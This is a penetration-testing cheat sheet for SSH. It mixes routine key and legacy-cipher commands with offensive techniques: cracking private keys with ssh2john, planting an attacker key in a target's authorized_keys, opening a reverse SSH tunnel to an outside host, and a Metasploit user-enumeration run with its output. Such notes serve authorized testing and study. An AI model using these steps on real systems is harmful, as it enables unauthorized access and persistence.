# 22 - SSH

### Add an SSH-key

```
ssh-keygen -t rsa
ssh-copy-id -i ~/.ssh/id_rsa.pub root@x.x.x.x
```

### Decrypt RSA file

```
ssh2john id_rsa
```

or you can user [sshng2john](https://raw.githubusercontent.com/stricture/hashstack-server-plugin-jtr/master/scrapers/sshng2john.py) which supports cracking into a format for [jumbo john](https://github.com/openwall/john) (john the ripper but for GPU)

```
pyhton sshng2john id_rsa
```

### Copy SSH public file

On your target machine:

```
echo "<your .ssh/key.pub>" > ~/.ssh/authorized_keys
```

### Reverse SSH tunnel

On the internal machine:

```
ssh -R 19999:localhost:22 leon@externalip.com
```

Creates listening tunnel on 19999

On the external machine:

```
ssh user@localhost -p19999
```

Connects to 19999 to ssh back to the start of the tunnel using the remote machine's username and password

### Enumeration

```
msf5 auxiliary(scanner/ssh/ssh_enumusers) > show options  
Module options (auxiliary/scanner/ssh/ssh_enumusers): 
Name Current Setting Required Description 
---- --------------- -------- ----------- 
CHECK_FALSE false no Check for false positives (random username) 
Proxies no A proxy chain of format type:host:port[,type:host:port][...] 
RHOSTS yes The target address range or CIDR identifier 
RPORT 22 yes The target port 
THREADS 1 yes The number of concurrent threads 
THRESHOLD 10 yes Amount of seconds needed before a user is considered found (timing attack only) 
USERNAME no Single username to test (username spray) 
USER_FILE no File containing usernames, one per line 
Auxiliary action: 
Name Description 
---- ----------- 
Malformed Packet Use a malformed packet 
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set THREADS 50 
THREADS => 50 
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 10.10.10.86 
RHOSTS => 10.10.10.86 
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE users.lst 
USER_FILE => users.lst 
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run 
[*] 10.10.10.86:22 - SSH - Using malformed packet technique 
[*] 10.10.10.86:22 - SSH - Starting scan 
[-] 10.10.10.86:22 - SSH - User 'jackie.abbott' not found 
[-] 10.10.10.86:22 - SSH - User 'isidro' not found 
[-] 10.10.10.86:22 - SSH - User 'roy' not found 
[-] 10.10.10.86:22 - SSH - User 'colleen' not found 
[-] 10.10.10.86:22 - SSH - User 'harrison.hessel' not found 
[-] 10.10.10.86:22 - SSH - User 'asa.christiansen' not found 
[-] 10.10.10.86:22 - SSH - User 'jessie' not found 
[-] 10.10.10.86:22 - SSH - User 'milton_hintz' not found 
[-] 10.10.10.86:22 - SSH - User 'demario_homenick' not found 
[-] 10.10.10.86:22 - SSH - User 'paris' not found 
[-] 10.10.10.86:22 - SSH - User 'gardner_ward' not found 
[-] 10.10.10.86:22 - SSH - User 'daija.casper' not found 
[-] 10.10.10.86:22 - SSH - User 'alanna.prohaska' not found 
[-] 10.10.10.86:22 - SSH - User 'russell_borer' not found 
[-] 10.10.10.86:22 - SSH - User 'domenica.kulas' not found 
[-] 10.10.10.86:22 - SSH - User 'nick' not found 
[-] 10.10.10.86:22 - SSH - User 'rose' not found 
[-] 10.10.10.86:22 - SSH - User 'pat_wilkinson' not found 
[+] 10.10.10.86:22 - SSH - User 'genevieve' found 
[-] 10.10.10.86:22 - SSH - User 'blaise.sauer' not found 
[-] 10.10.10.86:22 - SSH - User 'abbigail' not found
```

### SSH Mismatch

if you get the error:&#x20;

`Unable to negotiate with 123.123.123.123 port 22: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1`

Use the '-oKexAlgorithms' or '-keyexchange'&#x20;

**Example**:&#x20;

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@legacyhost
```



### Install ssh v1&#x20;

```
sudo apt-get install -y openssh-client-ssh1
```

